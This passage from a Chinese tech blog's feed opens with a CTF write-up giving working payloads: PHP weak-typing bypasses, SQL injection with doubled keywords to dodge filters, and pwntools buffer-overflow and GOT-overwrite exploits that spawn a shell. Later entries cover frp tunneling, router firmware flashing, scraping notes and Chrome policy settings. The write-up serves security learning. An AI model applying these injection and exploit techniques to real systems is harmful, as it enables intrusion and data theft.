……，逐位获得flag，python代码如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">last = 0x72 # 第二个端点处取得的字符再颠倒</span><br><span class="line">one = 0x31# 字符&quot;1&quot;</span><br><span class="line">two = 0x32# 字符&quot;2&quot;</span><br><span class="line">flag = last ^ 0x7 ^ one# 用1或2 取决于第一个断点处所得值</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="UnSafe-PHP"><a href="#UnSafe-PHP" class="headerlink" title="UnSafe PHP"></a>UnSafe PHP</h2><blockquote><p>传闻PHP是世界上最好的语言，但方便的同时也带来了隐患，‘弱类型’就可能引发很多问题。</p></blockquote><p>考查php弱类型，根据提交的json在最下面显示输出，代码如下，注释里写过程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">include &quot;flag.php&quot;; </span><br><span class="line"></span><br><span class="line">$v1=0;$v2=0; </span><br><span class="line"></span><br><span class="line">$a=(array)json_decode(@$_GET[&apos;answer&apos;]); </span><br><span class="line"># 提交index.php?answer=&#123;&#125;</span><br><span class="line">if(is_array($a))&#123; </span><br><span class="line"># 读取$a时已转换成array，应该能通过</span><br><span class="line"></span><br><span class="line">    is_numeric(@$a[&quot;para1&quot;])?die(&quot;nope1&quot;):NULL; </span><br><span class="line">    if(@$a[&quot;para1&quot;])&#123; </span><br><span class="line">        ($a[&quot;para1&quot;]&gt;2016)?$v1=1:NULL; </span><br><span class="line">    &#125; </span><br><span class="line"># $a[&quot;para1]既不是数又要大于2016</span><br><span class="line"># 由php手册 http://php.net/manual/zh/language.operators.comparison.php</span><br><span class="line"># 字符串和数值时比较会转换成数值，故应为含数值的字符串 </span><br><span class="line"></span><br><span class="line">    if(is_array(@$a[&quot;para2&quot;]))&#123; </span><br><span class="line">        if(count($a[&quot;para2&quot;])!==5 OR !is_array($a[&quot;para2&quot;][0])) die(&quot;nope2&quot;); </span><br><span class="line"># a[&quot;para2&quot;]为含5个元素的数组，且第一个元素为数组</span><br><span class="line"></span><br><span class="line">        $pos = array_search(&quot;balabala&quot;, $a[&quot;para2&quot;]); </span><br><span class="line">        $pos===false?die(&quot;nope3&quot;):NULL; </span><br><span class="line">        foreach($a[&quot;para2&quot;] as $key=&gt;$val)&#123; </span><br><span class="line">            $val===&quot;balabala&quot;?die(&quot;nope4&quot;):NULL; </span><br><span class="line">        &#125; </span><br><span class="line"># a[&quot;para2&quot;]中既要有balabala，又不能有balabala</span><br><span class="line"># 根据php手册 http://php.net/manual/zh/function.array-search.php</span><br><span class="line"># array_search()中字符串和数值比较同样有类型问题</span><br><span class="line"># 即 &quot;balabala&quot;转化成数值应为0，故需有元素为0</span><br><span class="line"></span><br><span class="line">        $v2=1; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if($v1 &amp;&amp; $v2)&#123; </span><br><span class="line"></span><br><span class="line">    echo $flag; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最终payload：/index.php?answer={“para1”:”2017 “,”para2”:[[2],3,3,3,0]}</p><h2 id="SQLinjection"><a href="#SQLinjection" class="headerlink" title="SQLinjection"></a>SQLinjection</h2><blockquote><p>Hint2:测试的时候记得把’#’url编码</p></blockquote><p>在login，register，index中找到注入点在/index.php?id=1处，id=1-4组合起来是”hey there flag is in the database”。先用sqlmap跑了一遍，无果<em>(:з」∠)</em>，转而投奔手注。</p><p>测试发现union,select,from,and,or,&amp;均被过滤(降低难度后union被放出)，用selselectect,frfromom，||解决。测试1’ || 1=1 #时报错，根据hint2将#改为%23后可通过。</p><p>查阅网上wp后尝试表名列名均为flag，用id=-1’ union selselect flag frfromom flag%23竟然过了，<del>好像大家都是这么做出来的。（雾</del></p><p>拿到flag后正经盲注，information里or用oorr绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 表名:flag,id,user</span><br><span class="line">id=-1&apos; union selselectect group_concat(table_name) frfromom infoorrmation_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"># 列名:flag</span><br><span class="line">id=-1&apos; union selselectect group_concat(column_name) frfromom infoorrmation_schema.columns where table_name = &apos;flag&apos;%23</span><br><span class="line"></span><br><span class="line"># flag</span><br><span class="line">id=-1&apos; union selselectect flag frfromom flag%23</span><br></pre></td></tr></table></figure><hr><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/getshell_1.png" alt="getshell_1"></p><p>看到pwn函数调用了system(“bin/sh”)，应该要跳转到这个地址。main里调用了gets()，故用v4覆写掉return的地址。</p><p>python脚本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;10.105.40.215&quot;,4445)</span><br><span class="line">print p.recvuntil(&quot;name&quot;)</span><br><span class="line">payload = &quot;a&quot; * (0xa + 0x8) + p64(0x4006d6) # 程序为64位</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h2><blockquote><p>Hint1:数组边界溢出</p><p>Hint2:改写GOT表</p></blockquote><p><del>由上题权限漏洞可知此题flag（雾</del></p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_1.png" alt="array_main"></p><p>根据hint1，发现name和数组a地址都在bss段。</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_2.png" alt="array_bss"></p><p>根据hint2，查看got表地址，计算可得各函数的地址，如puts为a[-17]，printf为a[-18]。</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_3.png" alt="array_got"></p><p>由第一题(Getshell)，猜测此题也是通过调用system(“bin/sh”)来拿到flag，将name设为“/bin/sh”，system地址覆写puts地址，即可在调用puts(name)时调用system(“bin/sh”)。</p><p>然而got表没有system，经查阅得知函数地址是动态链接的，需通过已链接函数地址计算system地址，算式为system-libc_system=printf-libc_printf（用其他已调用函数也可行）。</p><p>libc中函数地址可将libc.so.6丢进ida查看，后来得知也能通过gdb直接查找（下图）。printf函数因为在之前已经被调用过所以a[-18]显示的是链接后的地址，故本题有两次读写操作。</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_6.png" alt="array_readelf"></p><p>同时，因为格式化字符串的%d，所以地址要用十进制进行操作。</p><p>故解题过程为：</p><ol><li>将/bin/sh写入name</li><li>读取a[-18]，即已知的printf动态地址。</li><li>由system=printf-libc_printf+libc_system计算出system的动态地址</li><li>将十进制的地址写入a[-17]，即要调用的puts()函数的地址</li><li>调用puts(name)时，实际调用system(“/bin/sh”)，getshell。</li></ol><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_5.png" alt="array_ans"></p><p>P.S. 题目附带的libc文件是服务器的libc库，本地测试时调用的是本地的库，本地libc库位置可通过gdb中查看，如下图。</p><p><img src="https://github.com/hydewww/CTF-Writeup/raw/master/TSCTF_ShortSemester/images/array_4.png" alt="array_libc"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第二次CTF，在大佬的指导下竟然通关了，虽然不是次正规的比赛，不过体验还不错。题目和官方WP repo &lt;a href=&quot;https://github.com/hydewww/CTF-Writeup/tree/master/TSCTF_ShortSemester&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;戳这里&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Security" scheme="https://www.hydewww.cn/categories/Security/"/>
    
    
      <category term="CTF" scheme="https://www.hydewww.cn/tags/CTF/"/>
    
      <category term="writeup" scheme="https://www.hydewww.cn/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>frp实现内网穿透+开机自启</title>
    <link href="https://www.hydewww.cn/frp/"/>
    <id>https://www.hydewww.cn/frp/</id>
    <published>2017-08-20T16:00:00.000Z</published>
    <updated>2017-08-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>想要在外网访问本机上的服务，如果分配到的是动态的公网ip，可以使用ddns(动态域名解析)，将变化的ip绑定在固定的域名上。然而ipv4地址日益紧缺，拨号得到的地址大多是运营商的大内网地址，这时就要用到内网穿透了。<strong>注意 : 需要自己有台独立ip的服务器</strong></p><p>安利国人开发的开源项目 frp: <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><a id="more"></a><p>具体的配置和使用在官方文档以及配置文件中都有详细说明，这里讲点没提到的。</p><hr><h1 id="选择版本"><a href="#选择版本" class="headerlink" title="选择版本"></a>选择版本</h1><p>作者发布的为编译后的文件，需要自己按照cpu选择对应版本，可在命令行中输入如下进行查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/cpuinfo</span><br></pre></td></tr></table></figure><hr><h1 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h1><h2 id="systemd"><a href="#systemd" class="headerlink" title="systemd"></a>systemd</h2><p>适用于CentOS/RHEL7以上，Ubuntu 15以上，Debian8以上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=frps daemon</span><br><span class="line">After=syslog.target</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line"># 此处需要修改成 你自己的frps路径</span><br><span class="line">ExecStart=/root/frp/frps -c /root/frp/frps.ini</span><br><span class="line">ExecStop=/usr/bin/killall frps</span><br><span class="line">Restart= always</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>将上述脚本保存为 <strong>/etc/systemd/system/frps.service</strong> 后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable frps.service &amp;&amp; systemctl start frps.service</span><br></pre></td></tr></table></figure><h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><p>在开机启动脚本中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改文件地址</span><br><span class="line">nohup /root/frp/frpc -c /root/frp/frpc.ini &amp;</span><br></pre></td></tr></table></figure><p>此处 <strong>nohup…&amp;</strong> 为后台运行</p><p>p.s.<a href="http://see.sl088.com/wiki/Coreutils-nohup" target="_blank" rel="noopener">nohup</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opkg update</span><br><span class="line">opkg install opkg install coreutils-nohup</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想要在外网访问本机上的服务，如果分配到的是动态的公网ip，可以使用ddns(动态域名解析)，将变化的ip绑定在固定的域名上。然而ipv4地址日益紧缺，拨号得到的地址大多是运营商的大内网地址，这时就要用到内网穿透了。&lt;strong&gt;注意 : 需要自己有台独立ip的服务器&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安利国人开发的开源项目 frp: &lt;a href=&quot;https://github.com/fatedier/frp&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/fatedier/frp&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Service" scheme="https://www.hydewww.cn/categories/Service/"/>
    
    
      <category term="frp" scheme="https://www.hydewww.cn/tags/frp/"/>
    
      <category term="内网穿透" scheme="https://www.hydewww.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>路由宝L1刷潘多拉</title>
    <link href="https://www.hydewww.cn/youkuL1-padorabox/"/>
    <id>https://www.hydewww.cn/youkuL1-padorabox/</id>
    <published>2017-08-19T16:00:00.000Z</published>
    <updated>2017-08-19T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>记录优酷路由宝L1刷潘多拉的过程，用来实现多拨等功能。</p><a id="more"></a><p>固件: 2.1.0313.8617</p><h1 id="开启telnet"><a href="#开启telnet" class="headerlink" title="开启telnet"></a>开启telnet</h1><p>官方管理界面， <strong>手动升级</strong> 刷带telnet固件，cmd输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.168.11.1</span><br></pre></td></tr></table></figure><hr><h1 id="备份原固件"><a href="#备份原固件" class="headerlink" title="备份原固件"></a>备份原固件</h1><p>telnet内输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/mtd0 of=/tmp/youku/mnt/tf2/fullflash.bin</span><br><span class="line">ln -s /tmp/youku/mnt/tf2/fullflash.bin /www/fullflash.bin</span><br></pre></td></tr></table></figure><p>浏览器输入 <a href="http://192.168.11.1/fullflash.bin" target="_blank" rel="noopener">http://192.168.11.1/fullflash.bin</a> 下载固件至电脑</p><hr><h1 id="解锁Bootloadeer"><a href="#解锁Bootloadeer" class="headerlink" title="解锁Bootloadeer"></a>解锁Bootloadeer</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mtd unlock Bootloader</span><br><span class="line"></span><br><span class="line"># 返回 Unlocking Bootloader ...</span><br></pre></td></tr></table></figure><hr><h1 id="刷入breed"><a href="#刷入breed" class="headerlink" title="刷入breed"></a>刷入breed</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://breed.hackpascal.net/breed-mt7620-youku-yk1.bin</span><br><span class="line">mtd -r write /tmp/breed-mt7620-youku-yk1.bin Bootloader</span><br></pre></td></tr></table></figure><p>路由器重启，按住reset键断电插电，几秒后松手，192.168.1.1进入breed</p><h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>u盘目录为 /mnt/sda1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/mtd # 查看BootLoader是哪一个mtd</span><br></pre></td></tr></table></figure><hr><h1 id="刷潘多拉"><a href="#刷潘多拉" class="headerlink" title="刷潘多拉"></a>刷潘多拉</h1><p><a href="http://downloads.pandorabox.com.cn/" target="_blank" rel="noopener">http://downloads.pandorabox.com.cn/</a></p><p>在breed <strong>系统</strong> 先备份，选择潘多拉固件升级。</p><hr><h1 id="合并TF卡"><a href="#合并TF卡" class="headerlink" title="合并TF卡"></a>合并TF卡</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l # 硬盘列表</span><br><span class="line">df -h # 挂载列表</span><br></pre></td></tr></table></figure><h2 id="删除分区"><a href="#删除分区" class="headerlink" title="删除分区"></a>删除分区</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fdisk /dev/mmcblk0</span><br><span class="line">d</span><br><span class="line">回车</span><br><span class="line">d</span><br><span class="line">回车</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>直至删除所有分区</p><h2 id="新建分区"><a href="#新建分区" class="headerlink" title="新建分区"></a>新建分区</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fdisk /dev/mmcblk0</span><br><span class="line">n</span><br><span class="line">p</span><br><span class="line">1</span><br><span class="line">回车</span><br><span class="line">回车</span><br><span class="line">p</span><br><span class="line">w</span><br></pre></td></tr></table></figure><h2 id="格式化分区"><a href="#格式化分区" class="headerlink" title="格式化分区"></a>格式化分区</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">opkg update # 更新源</span><br><span class="line">opkg install e2fsprogs # ext4插件</span><br><span class="line">umount /dev/mmcblk0p1 # 取消挂载</span><br><span class="line">mkfs.ext4 /dev/mmcblk0p1 # 格式化为ext4</span><br><span class="line">回车 # 等待完成</span><br><span class="line">mount /dev/mmcblk0p1 /mnt/mmcblk0p1 # 挂载</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录优酷路由宝L1刷潘多拉的过程，用来实现多拨等功能。&lt;/p&gt;
    
    </summary>
    
      <category term="Life" scheme="https://www.hydewww.cn/categories/Life/"/>
    
    
      <category term="路由宝L1" scheme="https://www.hydewww.cn/tags/%E8%B7%AF%E7%94%B1%E5%AE%9DL1/"/>
    
      <category term="潘多拉" scheme="https://www.hydewww.cn/tags/%E6%BD%98%E5%A4%9A%E6%8B%89/"/>
    
  </entry>
  
  <entry>
    <title>Requests-BeautifulSoup-RE 爬虫</title>
    <link href="https://www.hydewww.cn/PythonSpider/"/>
    <id>https://www.hydewww.cn/PythonSpider/</id>
    <published>2017-07-29T16:00:00.000Z</published>
    <updated>2017-07-29T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理一下Python Requests-BeautifulSoup-Re 路线爬虫的笔记。</p><a id="more"></a><h1 id="Requests库"><a href="#Requests库" class="headerlink" title="Requests库"></a>Requests库</h1><h2 id="Sample"><a href="#Sample" class="headerlink" title="Sample"></a>Sample</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def getHTMLText(url):</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url,timeout= 30)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        return r.text</span><br><span class="line">    except:</span><br><span class="line">        print (&quot;Fail to get HTML text from&quot;,url)</span><br><span class="line">        return &apos;&apos;</span><br></pre></td></tr></table></figure><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>r.encoding : 从HTTP header中猜测的相应内容编码方式<br>r.apparent_encoding : 分析内容得出的编码方式</p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><ul><li>ConnectionError 连接错误（DNS查询失败、拒绝连接）</li><li>HTTPError HTTP错误</li><li>URLRequired URL缺失</li><li>TooManyRedirects 超过最大重定向</li><li>ConnectTimeout 连接服务器超时</li><li>Timeout 请求URL超时</li></ul><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p>r.content : 相应内容的二进制形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f.write(r.content)</span><br></pre></td></tr></table></figure><h2 id="kwargs"><a href="#kwargs" class="headerlink" title="**kwargs"></a>**kwargs</h2><h3 id="headers"><a href="#headers" class="headerlink" title="headers"></a>headers</h3><p>更改UserAgent</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UA = &#123;&apos;user-agent&apos;:&apos;Mozilla/5&apos;&#125;</span><br><span class="line">r = requests.get(url , headers = UA)</span><br></pre></td></tr></table></figure><h3 id="params"><a href="#params" class="headerlink" title="params"></a>params</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kv = &#123;&apos;wd&apos;:&apos;Python&apos;&#125;</span><br><span class="line">r = requests.get(&apos;http://www.baidu.com/s&apos; , params = kv)</span><br><span class="line">http://www.baidu.com/s?wd=Python</span><br></pre></td></tr></table></figure><h3 id="timeout"><a href="#timeout" class="headerlink" title="timeout"></a>timeout</h3><p>访问超时的时长</p><h3 id="proxies"><a href="#proxies" class="headerlink" title="proxies"></a>proxies</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pxs = &#123; &apos;http&apos;: &apos;http://user:pass@ip:port&apos;</span><br><span class="line">        &apos;https&apos;: &apos;https://ip:port&apos; &#125;</span><br></pre></td></tr></table></figure><hr><h1 id="BeautifulSoup库"><a href="#BeautifulSoup库" class="headerlink" title="BeautifulSoup库"></a>BeautifulSoup库</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup( r.context , &apos;html.parser&apos;)</span><br></pre></td></tr></table></figure><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><ul><li>Tag : soup.</li><li>Name : .name</li><li>Attributes : .attrs</li><li>NavigableString : .string</li><li>Comment : .string -</li></ul><p>除attrs返回为字典类型，其余为bs4.element.xxx</p><h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><ul><li>.contents : 子节点的列表</li><li>.children : 子节点的迭代类型</li><li>.descendants : 子孙节点的迭代类型</li><li>.parent : 父亲标签</li><li>.parents : 先辈标签的迭代类型</li><li>.next/previous_sibling(s) : 平行标签(同父亲下)</li></ul><h2 id="prettify"><a href="#prettify" class="headerlink" title=".prettify()"></a>.prettify()</h2><p>为HTML文本添加’\n’，使输出更友好</p><h2 id="信息提取"><a href="#信息提取" class="headerlink" title="信息提取"></a>信息提取</h2><ul><li>&lt;&gt;.find_all : 等价于&lt;&gt;.() 返回列表</li><li>find() : 返回第一个结果</li><li>find_parent(s)()</li><li>find_next/previous_sibling(s)()</li></ul><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul><li>name : Tag’s name</li><li>attrs : () (=)</li><li>recursive : 是否检索全部子孙 默认True</li><li>string : 检索&lt;&gt;..&lt;/&gt;中字符串，只返回字符串</li></ul><hr><h1 id="Re正则表达式-regular-expression-regex"><a href="#Re正则表达式-regular-expression-regex" class="headerlink" title="Re正则表达式 (regular expression, regex)"></a>Re正则表达式 (regular expression, regex)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">re.search(r&apos;python&apos;,r.context,re.I)</span><br></pre></td></tr></table></figure><h2 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h2><h2 id="操作符-1"><a href="#操作符-1" class="headerlink" title="操作符"></a>操作符</h2><ul><li>. : 表示任何单字符(除\n)</li><li><strong>[ ]</strong> : 字符集，单字符取值范围</li><li>[^ ] : 非字符集</li><li>* : 前一个字符至少0次扩展</li><li>+ : 前一个字符至少1次扩展</li><li>? : 前一个字符0或1次扩展</li><li>| : 左右表达式任意一个</li><li>{m} : 扩展前一个字符m次</li><li>{m,n} : 扩展前一个字符m至n次（含m,n)</li><li>^ : 匹配字符串开头</li><li>$ : 匹配字符串结尾</li><li>() : 分组标记，内部只能用|</li><li>\d : 数字 [0-9]</li><li>\w : 单词 [A-Za-z0-9]</li></ul><h3 id="最小匹配"><a href="#最小匹配" class="headerlink" title="最小匹配"></a>最小匹配</h3><p>*? +? ?? {m,n}?</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul><li>(pattern, string, flags)</li><li>search() : 搜索第一个匹配项，返回match</li><li>match() : 从string开始位置进行匹配，返回match</li><li>findall() : 列表返回所有匹配子串</li><li>split() : 按匹配结果进行分割</li><li>finditer() : 返回迭代类型，迭代元素为match对象</li><li>sub(pattern, repl, string, count) : 返回替换后的字符串</li></ul><h3 id="flags"><a href="#flags" class="headerlink" title="flags"></a>flags</h3><ul><li>re.I : re.IGNORECASE</li><li>re.M : re.MULTLINE ^操作符将文本每行当作匹配开始</li><li>re.S : re.DOTALL .匹配所有字符 包括\n</li></ul><h3 id="等价用法"><a href="#等价用法" class="headerlink" title="等价用法"></a>等价用法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regex = re.compile(pattern)</span><br><span class="line">regex.method(string, flags)</span><br></pre></td></tr></table></figure><h2 id="Match对象"><a href="#Match对象" class="headerlink" title="Match对象"></a>Match对象</h2><h3 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h3><ul><li>string : 带匹配文本</li><li>re : 匹配时的pattern对象(re.compile())</li><li>pos : 搜索开始位置</li><li>endpos : 搜索结束位置</li></ul><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ul><li>group(0) : 获得匹配的字符串</li><li>start() : 匹配字符串的开始位置</li><li>end()</li><li>span() : 返回(.start(), .end()) 元组</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;整理一下Python Requests-BeautifulSoup-Re 路线爬虫的笔记。&lt;/p&gt;
    
    </summary>
    
      <category term="Coding" scheme="https://www.hydewww.cn/categories/Coding/"/>
    
    
      <category term="Python" scheme="https://www.hydewww.cn/tags/Python/"/>
    
      <category term="BeautifulSoup" scheme="https://www.hydewww.cn/tags/BeautifulSoup/"/>
    
      <category term="爬虫" scheme="https://www.hydewww.cn/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>解决Chrome扩展停用</title>
    <link href="https://www.hydewww.cn/ChromeExtension/"/>
    <id>https://www.hydewww.cn/ChromeExtension/</id>
    <published>2017-07-18T16:00:00.000Z</published>
    <updated>2017-07-18T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Chrome 会强制停用不是扩展商店中的应用，可通过修改组策略解决。</p><a id="more"></a><h1 id="打开组策略"><a href="#打开组策略" class="headerlink" title="打开组策略"></a>打开组策略</h1><p><code>Win+R</code> 打开运行框，输入 <code>gpedit.msc</code> 即可打开。</p><h1 id="下载模板"><a href="#下载模板" class="headerlink" title="下载模板"></a>下载模板</h1><p>下载并解压 <a href="https://dl.google.com/dl/edgedl/chrome/policy/policy_templates.zip" target="_blank" rel="noopener">https://dl.google.com/dl/edgedl/chrome/policy/policy_templates.zip</a></p><p>来源：<a href="https://support.google.com/chrome/a/answer/187202?hl=zh-Hans" target="_blank" rel="noopener">https://support.google.com/chrome/a/answer/187202?hl=zh-Hans</a></p><h1 id="添加模板"><a href="#添加模板" class="headerlink" title="添加模板"></a>添加模板</h1><p>右键 <strong>计算机配置-管理模板</strong> 选择 <strong>添加/删除模板</strong></p><p>添加 <strong>policy_templates\windows\adm\zh-CN\chrome.adm</strong> 后关闭，即可在 <strong>管理模板-经典管理模板</strong> 中看到 <strong>Google</strong></p><h1 id="启用扩展程序"><a href="#启用扩展程序" 